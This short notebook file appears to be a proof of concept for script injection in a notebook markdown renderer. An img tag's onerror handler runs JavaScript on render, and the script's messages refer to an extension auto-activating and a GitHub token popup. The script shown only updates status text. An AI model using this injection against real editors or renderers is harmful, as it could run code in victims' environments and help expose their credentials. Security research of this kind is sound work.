# %% [markdown]
# <img src="data:foobar" onerror='
# const updateStatus = text => {
#   const status = getRootNode().querySelector("#status");
#   if (status) status.innerText = text;
# }
# const sleep = ms => new Promise(r => setTimeout(r, ms));
# async function runPayload() {
#   updateStatus("Waiting for extension to auto-activate...");
#   await sleep(3000);
#   updateStatus("✅ Check for popup with your GitHub token!");
# }
# runPayload();
# '>
#
# # Javascript Payload
#
# <b>Status:</b> <span id="status">JS hasn't run yet</span>
